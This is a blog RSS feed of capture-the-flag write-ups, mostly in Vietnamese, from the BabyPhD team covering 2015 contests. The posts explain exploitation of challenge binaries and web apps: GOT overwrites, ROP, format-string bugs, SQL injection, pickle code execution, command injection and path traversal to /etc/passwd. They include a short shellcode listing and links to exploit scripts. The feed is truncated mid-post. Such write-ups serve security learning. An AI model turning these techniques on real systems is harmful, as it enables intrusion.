@@ -1,0 +1,556 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+>
+
+<channel>
+	<title>peternguyen &#8211; BabyPhD CTF Team</title>
+	<atom:link href="https://babyphd.net/author/peternguyen/feed/" rel="self" type="application/rss+xml" />
+	<link>https://babyphd.net</link>
+	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
+	<lastBuildDate>Wed, 28 Oct 2015 03:08:21 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
+		<title>[Whitehat GrandPrix 2015] Writeup</title>
+		<link>https://babyphd.net/2015/10/28/whitehat-grandprix-2015-writeup/</link>
+				<comments>https://babyphd.net/2015/10/28/whitehat-grandprix-2015-writeup/#comments</comments>
+				<pubDate>Wed, 28 Oct 2015 03:03:23 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[whitehat]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=367</guid>
+				<description><![CDATA[Pwn200: ASLR tắt, bug cho phép ghi đè 2 byte vào địa chỉ char *buf = malloc(20);. Với ASLR tắt thì địa chỉ map của [heap] section sex fix ở dạng 0x0804xxxx, do đó ta có thể điều khiểu *buf = got_table một cách dễ dàng. Phương pháp khai thác như sau: Ghi đè free's &#8230; <a href="https://babyphd.net/2015/10/28/whitehat-grandprix-2015-writeup/" class="more-link">Continue reading <span class="screen-reader-text">[Whitehat GrandPrix 2015] Writeup</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<h3>Pwn200:</h3>
+<p>ASLR tắt, bug cho phép ghi đè 2 byte vào địa chỉ char *buf = malloc(20);. Với ASLR tắt thì địa chỉ map của [heap] section sex fix ở dạng 0x0804xxxx, do đó ta có thể điều khiểu *buf = got_table một cách dễ dàng. Phương pháp khai thác như sau:</p>
+<ul>
+<li>Ghi đè free's got = trở lại phần read để đọc &gt; 40 bytes =&gt; stack overflow.</li>
+<li>Ghi đè strtoimax's = địa chỉ lệnh ret</li>
+<li>Ghi đè memcpy =&gt; leave;ret =&gt; tiến hành trigger buffer overflow khi trở lại hàm read để đọc &gt; 40 bytes. Ngoài ra do ASLR tắt nên địa chỉ map của libc luôn fix, nên công việc còn lại chỉ là bruteforce libc base addr.</li>
+</ul>
+<p>Mã khai thác: <a href="https://gist.github.com/peternguyen93/f4e9bf786c2df2ab968f">https://gist.github.com/peternguyen93/f4e9bf786c2df2ab968f</a></p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-10-27%20at%209.54.57%20AM_zpsqxocsbdg.png?resize=604%2C196&#038;ssl=1" alt="" width="604" height="196" data-recalc-dims="1" /></p>
+<h3>Pwn300:</h3>
+<p>Lỗ hổng stack base buffer overflow rất rõ ràng khi sử dụng hàm gets(buf), do binary được compiled 32 bit do đó ta có thể control địa chỉ flag và đọc được bất cứ dữ liệu nào của memory</p>
+<pre class="lang:c decode:true " title="pesudo-code">void find_flag(char *flag)
+{
+    char buf[256];
+    make_flag(flag); //đổi flag
+    while(1){
+       gets(buf);
+       printf("%s%s\n",buf,flag);
+    }
+}</pre>
+<p>Mã khai thác</p>
+<p><a href="https://gist.github.com/peternguyen93/e187ad6cee83346298ce">https://gist.github.com/peternguyen93/e187ad6cee83346298ce</a></p>
+<h3>Pwn500:</h3>
+<p>Binary sử dụng các kỹ thuật anti-debug và cấm sử dụng các syscall (execve,fork,clone). Ngoài ra lỗ hổng buffer overflow khá là rõ ràng, binary được compile bằng PIE. Tuy nhiên, hàm read không tự động viết null bye vào cuối, do đó ta có thể leak được canary và libc_base , thông qua các bước sau:</p>
+<ul>
+<li>Leak canary.</li>
+<li>Ghi đè địa chỉ return address về main</li>
+<li>Leak libc_start_main =&gt; libc_base</li>
+<li>Tiến hành sử dụng rop chain để build mã đọc flag và trả về.</li>
+</ul>
+<p><a href="https://gist.github.com/peternguyen93/c4dda7ef5dd7cb549a2f">https://gist.github.com/peternguyen93/c4dda7ef5dd7cb549a2f</a></p>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-10-27%20at%209.55.04%20AM_zpsr3hxmfxu.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-10-27%20at%209.55.04%20AM_zpsr3hxmfxu.png?resize=604%2C334" alt="" width="604" height="334" data-recalc-dims="1" /></a></p>
+<h3>Web100:</h3>
+<p>SQL Injection, do chưa filter đấu '\'. Ngoài ra trước khi hết thúc xử lý request, web100 gọi hàm re.findall(r'(y+)*',row), hàm regex findall match tất cả các substring có thể match, ngoài ra chuỗi regex (y+)* với một chút google ta có kq sau <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS</a> , đo đó có thể build một query cho phép ta có thể phân biệt được trạng thái đúng hoặc sai để blind flag dựa trên time base.</p>
+<p><a href="https://gist.github.com/peternguyen93/75839e252257e9da62e4">https://gist.github.com/peternguyen93/75839e252257e9da62e4</a></p>
+<h3>Web200:</h3>
+<p>Lỗ hỗng rất rõ ràng khi web app sử dụng pickle data serialization, thông qua đó ta có thể sử dụng code injection để có được shell trên server.</p>
+<p><a href="https://gist.github.com/peternguyen93/c168c15919a3203acfe2">https://gist.github.com/peternguyen93/c168c15919a3203acfe2</a></p>
+<h3>Web300:</h3>
+<p>Lỗi LFI cho phép có thể lấy được mã nguồn của website, trong đó thấy được một script cgi lấy thông tin về thời gian. Script này bị lỗi command injection, do giới hạn các hàm connect back, để get shell ta lợi dụng file /run/cgicounter ta có thể đọc từng ký tự của command trả về.</p>
+<p><a href="https://gist.github.com/peternguyen93/0c34bc33d99ff71593a7">https://gist.github.com/peternguyen93/0c34bc33d99ff71593a7</a></p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2015/10/28/whitehat-grandprix-2015-writeup/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">367</post-id>	</item>
+		<item>
+		<title>CSAW 2015 CTF All Exploitable Solutions (Script only)</title>
+		<link>https://babyphd.net/2015/09/21/csaw-2015-ctf-all-exploitable-solutions-script-only/</link>
+				<comments>https://babyphd.net/2015/09/21/csaw-2015-ctf-all-exploitable-solutions-script-only/#comments</comments>
+				<pubDate>Mon, 21 Sep 2015 02:45:25 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=359</guid>
+				<description><![CDATA[I'm too lazy to write up in deep these challenges, but i will give you my solution to solve these challenges. You will do it by yourself before you read my exploit script, that makes you understand deeper. I hope you enjoy with this. Happy pwnning. Contacts: https://gist.github.com/peternguyen93/478baa59191e3108d0a3 FTP: https://gist.github.com/peternguyen93/23fd065e4ce0afb9f242 AutoBots: https://gist.github.com/peternguyen93/6a53ee3596ff89233710 Memeshop: https://gist.github.com/peternguyen93/d9ffaa75eab24efeecc3 Rhinoxorus: https://gist.github.com/peternguyen93/a5d79671bbc99ef75cb0]]></description>
+								<content:encoded><![CDATA[<p>I'm too lazy to write up in deep these challenges, but i will give you my solution to solve these challenges. You will do it by yourself before you read my exploit script, that makes you understand deeper. I hope you enjoy with this. Happy pwnning.</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?ssl=1"><img data-attachment-id="362" data-permalink="https://babyphd.net/2015/09/21/csaw-2015-ctf-all-exploitable-solutions-script-only/attachment/1119/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?fit=250%2C235&amp;ssl=1" data-orig-size="250,235" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1119" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?fit=250%2C235&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?fit=250%2C235&amp;ssl=1" class="alignnone size-full wp-image-362" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?resize=250%2C235&#038;ssl=1" alt="1119" width="250" height="235" data-recalc-dims="1" /></a></p>
+<ul>
+<li>Contacts: <a href="https://gist.github.com/peternguyen93/478baa59191e3108d0a3">https://gist.github.com/peternguyen93/478baa59191e3108d0a3</a></li>
+<li>FTP: <a href="https://gist.github.com/peternguyen93/23fd065e4ce0afb9f242">https://gist.github.com/peternguyen93/23fd065e4ce0afb9f242</a></li>
+<li>AutoBots: <a href="https://gist.github.com/peternguyen93/6a53ee3596ff89233710">https://gist.github.com/peternguyen93/6a53ee3596ff89233710</a></li>
+<li>Memeshop: <a href="https://gist.github.com/peternguyen93/d9ffaa75eab24efeecc3">https://gist.github.com/peternguyen93/d9ffaa75eab24efeecc3</a></li>
+<li>Rhinoxorus: <a href="https://gist.github.com/peternguyen93/a5d79671bbc99ef75cb0">https://gist.github.com/peternguyen93/a5d79671bbc99ef75cb0</a></li>
+</ul>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2015/09/21/csaw-2015-ctf-all-exploitable-solutions-script-only/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">359</post-id>	</item>
+		<item>
+		<title>[Write up] DEFCON CTF 2015 - wwtv , cybergrandsandbox</title>
+		<link>https://babyphd.net/2015/05/18/write-up-defcon-ctf-2015-wwtv-cybergrandsandbox/</link>
+				<pubDate>Mon, 18 May 2015 15:29:37 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=351</guid>
+				<description><![CDATA[WWTV The bug is easy to find at function Coordidate, this is basic format string bug But before you enter printf(s), we must to bypass the check a pair float number is parsed from s, to bypass it we just append format string bug to the end of the pair '51.492137,-0.192878' , for more information &#8230; <a href="https://babyphd.net/2015/05/18/write-up-defcon-ctf-2015-wwtv-cybergrandsandbox/" class="more-link">Continue reading <span class="screen-reader-text">[Write up] DEFCON CTF 2015 - wwtv , cybergrandsandbox</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<h1><strong>WWTV</strong></h1>
+<p>The bug is easy to find at function <strong>Coordidate</strong>, this is <strong>basic format string bug</strong></p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.12%20PM_zpsv7pq1eki.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.12%20PM_zpsv7pq1eki.png?resize=604%2C359" alt="" width="604" height="359" data-recalc-dims="1" /></a></p>
+<p>But before you enter <strong>printf(s)</strong>, we must to bypass the check a pair float number is parsed from s, to bypass it we just append <strong>format string bug</strong> to the end of the pair '51.492137,-0.192878' , for more information about atof read this http://www.cplusplus.com/reference/cstdlib/atof/</p>
+<p>So the payload to exploit this bug too easy:</p>
+<ol>
+<li>First, we need to leak binary base address, and libc address</li>
+<li>Second, calc system address and then overwrite atof got by system address and then pwned.</li>
+</ol>
+<p>But the game is not over, before we exploit the bug, we need to solve 2 problems:</p>
+<p>We must to write a program to solve the game to enter TARDIS mode (this task is to quite strange)</p>
+<p>We must bypass timecheck to enter vulnerable function</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.31%20PM_zps5cjo7w5t.png?resize=604%2C401&#038;ssl=1" alt="" width="604" height="401" data-recalc-dims="1" /></p>
+<pre class="lang:c decode:true">time_c &gt; 0x55592B6C &amp;&amp; time_c &lt;= 0x55592B7F;</pre>
+<p>We must set time_c in range <strong>(0x55592b6c,0x55592b7f]</strong>.</p>
+<p>Take a look at <strong>READ_DATA</strong> function , will be triggered after 2 second.</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.50%20PM_zpswdzdbei7.png?resize=604%2C302&#038;ssl=1" alt="" width="604" height="302" data-recalc-dims="1" /></p>
+<p>OMG, the buffer was used for saving the connection to localtime server was used to store user input. We just send 9 zero bytes to server and then wait until READ_DATA is triggered and then send 4 bytes in require range, and we will enter vulnerable function.</p>
+<p>Our poc here : <a href="https://gist.github.com/peternguyen93/f06aa5e27626598a1c21">https://gist.github.com/peternguyen93/f06aa5e27626598a1c21</a></p>
+<h1><strong>CyberGrandSandbox</strong></h1>
+<p>This is very interesting challenge.</p>
+<p>After doing RE we find some usefull information:</p>
+<p>This program implementing basic <strong>Polish Notation </strong>by using JIT compiler.</p>
+<p>The structure of jit is:</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%2010.16.00%20PM_zpsv7mooby2.png?resize=604%2C108&#038;ssl=1" alt="" width="604" height="108" data-recalc-dims="1" /></p>
+<p>Take a look at function <strong>handle_digit </strong></p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.52.13%20PM_zpsyqmu8oxb.png?resize=604%2C329&#038;ssl=1" alt="" width="604" height="329" data-recalc-dims="1" /></p>
+<p>When we inputted a string of number is seperated by space character , the<strong> jit compiter</strong> will push it in the <strong>stack_buffer</strong>.</p>
+<p>We know that size of <strong>stack_buf</strong> is <strong>0x1000</strong> (located below stack_code), in this function there are no unbound checking if we push the <strong>stack_buf</strong> into stack_code, and so this bug does.</p>
+<p>We just write own shellcode and then overwrite some opcode in the end of asm_code with own shellcode  (because cgc executable is not have sys_execve syscall so we just use some syscall provided by CGC to read the flag).</p>
+<p>Our shellcode :</p>
+<pre class="lang:asm decode:true ">_start:
+	push 0x3
+	pop eax
+	push ebx
+	pop ecx
+	push 0x3
+	pop ebx
+	push 0x50
+	pop edx ;ebx hold my buffer
+	int 0x80
+	push 0x2
+	pop eax
+	push 0x1
+	pop ebx
+	int 0x80</pre>
+<p>Our poc is : <a href="https://gist.github.com/peternguyen93/e7d08cf109b38af6baae">https://gist.github.com/peternguyen93/e7d08cf109b38af6baae</a></p>
+<p>This is the first time i wrote writeup using english, if something went wrong or some point you dont understand, feel free to ask me above</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">351</post-id>	</item>
+		<item>
+		<title>[Whitehat Contest 8] Pwn200,Pwn500 Writeup</title>
+		<link>https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/</link>
+				<comments>https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/#comments</comments>
+				<pubDate>Sun, 01 Feb 2015 14:28:41 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=288</guid>
+				<description><![CDATA[Phân tích code, binary là một simple webserver , nhận request từ client và trả về dữ liệu cần yêu cầu, hỗ trợ (GET/HEAD) Chú ý 2 đoạn code sau Nhận path request , tiến hành urldecode rồi open cái file html/js/... mà client yêu cầu, sau đó trả về content. Kiểm tra hàm CleanURL &#8230; <a href="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/" class="more-link">Continue reading <span class="screen-reader-text">[Whitehat Contest 8] Pwn200,Pwn500 Writeup</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Phân tích code, binary là một simple webserver , nhận request từ client và trả về dữ liệu cần yêu cầu, hỗ trợ (GET/HEAD)</p>
+<p>Chú ý 2 đoạn code sau</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?ssl=1"><img data-attachment-id="291" data-permalink="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/screen-shot-2015-02-01-at-9-22-05-pm/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?fit=1146%2C184&amp;ssl=1" data-orig-size="1146,184" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2015-02-01 at 9.22.05 PM" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?fit=300%2C48&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?fit=604%2C97&amp;ssl=1" class="alignnone size-medium wp-image-291" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?resize=300%2C48&#038;ssl=1" alt="Screen Shot 2015-02-01 at 9.22.05 PM" width="300" height="48" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?resize=300%2C48&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?resize=1024%2C164&amp;ssl=1 1024w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?w=1146&amp;ssl=1 1146w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Nhận path request , tiến hành urldecode rồi open cái file html/js/... mà client yêu cầu, sau đó trả về content.</p>
+<p>Kiểm tra hàm CleanURL</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?ssl=1"><img data-attachment-id="292" data-permalink="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/screen-shot-2015-02-01-at-9-22-44-pm/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?fit=1108%2C762&amp;ssl=1" data-orig-size="1108,762" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2015-02-01 at 9.22.44 PM" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?fit=300%2C206&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?fit=604%2C415&amp;ssl=1" class="alignnone size-medium wp-image-292" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?resize=300%2C206&#038;ssl=1" alt="Screen Shot 2015-02-01 at 9.22.44 PM" width="300" height="206" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?resize=300%2C206&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?resize=1024%2C704&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?w=1108&amp;ssl=1 1108w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Hàm có tác vụ urldecode, tuy nhiền hàm này lại không filter '../' (path traveler) cho phép attacker có thể sử dụng '../' để read /etc/passwd (hoặc flag) chẳng hạn</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?ssl=1"><img data-attachment-id="289" data-permalink="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/screen-shot-2015-02-01-at-9-18-50-pm/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?fit=1266%2C542&amp;ssl=1" data-orig-size="1266,542" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2015-02-01 at 9.18.50 PM" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?fit=300%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?fit=604%2C258&amp;ssl=1" class="alignnone size-medium wp-image-289" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?resize=300%2C128&#038;ssl=1" alt="Screen Shot 2015-02-01 at 9.18.50 PM" width="300" height="128" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?resize=300%2C128&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?resize=1024%2C438&amp;ssl=1 1024w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?w=1266&amp;ssl=1 1266w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?w=1208&amp;ssl=1 1208w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?ssl=1"><img data-attachment-id="290" data-permalink="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/screen-shot-2015-02-01-at-9-19-00-pm/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?fit=1262%2C554&amp;ssl=1" data-orig-size="1262,554" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2015-02-01 at 9.19.00 PM" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?fit=300%2C132&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?fit=604%2C265&amp;ssl=1" class="alignnone size-medium wp-image-290" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?resize=300%2C132&#038;ssl=1" alt="Screen Shot 2015-02-01 at 9.19.00 PM" width="300" height="132" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?resize=300%2C132&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?resize=1024%2C450&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?w=1262&amp;ssl=1 1262w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?w=1208&amp;ssl=1 1208w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p><img class="alignnone" src="https://i1.wp.com/pik.vn/201440f654df-bbda-4c1b-abdd-c938bc30445b.gif?resize=450%2C307" alt="" width="450" height="307" data-recalc-dims="1" /></p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">288</post-id>	</item>
+		<item>
+		<title>[Write Up] Hackim CTF - mixme - PWN5</title>
+		<link>https://babyphd.net/2015/01/12/write-up-hackim-ctf-mixme-pwn5/</link>
+				<pubDate>Mon, 12 Jan 2015 05:35:09 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=237</guid>
+				<description><![CDATA[Đánh giá sơ lược về binary: ~/Sources/CTFs/hackim » file mixme peternguyen@peternguyen mixme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b93d20dd523097dd7d53a7fda265a2d977d29c30, stripped Checksec: Chương trình có 3 lệnh chính: (store/edit/get) Phân tích hàm edit Đựa trên hàm store, mình có thể reverse lại được cấu trúc &#8230; <a href="https://babyphd.net/2015/01/12/write-up-hackim-ctf-mixme-pwn5/" class="more-link">Continue reading <span class="screen-reader-text">[Write Up] Hackim CTF - mixme - PWN5</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Đánh giá sơ lược về binary:</p>
+<pre class="lang:zsh decode:true">~/Sources/CTFs/hackim » file mixme                               peternguyen@peternguyen
+mixme: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b93d20dd523097dd7d53a7fda265a2d977d29c30, stripped</pre>
+<p>Checksec:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111306AM_zps163b811d.png?resize=284%2C208" alt="" width="284" height="208" data-recalc-dims="1" /></p>
+<p>Chương trình có 3 lệnh chính: (<strong>store</strong>/<strong>edit</strong>/<strong>get</strong>)</p>
+<h5><strong>Phân tích hàm edit</strong></h5>
+<p>Đựa trên hàm store, mình có thể reverse lại được cấu trúc lưu trữ của chương trình như sau:</p>
+<pre class="lang:c decode:true">struct node{
+ char name[16];
+ int size;
+ char *data;
+ struct node *next;
+ struct node *prev;
+}</pre>
+<p>size là khích cỡ vùng nhớ được malloc cho data.</p>
+<p>Các node được lưu trữ bằng một danh sách double linked list circular</p>
+<p><img class="alignnone" src="https://i2.wp.com/3.bp.blogspot.com/_B6yuuJdg78o/TRzylm315aI/AAAAAAAAAKk/KKU-be6yPlI/s1600/image018.jpg?resize=458%2C92&#038;ssl=1" alt="" width="458" height="92" data-recalc-dims="1" /></p>
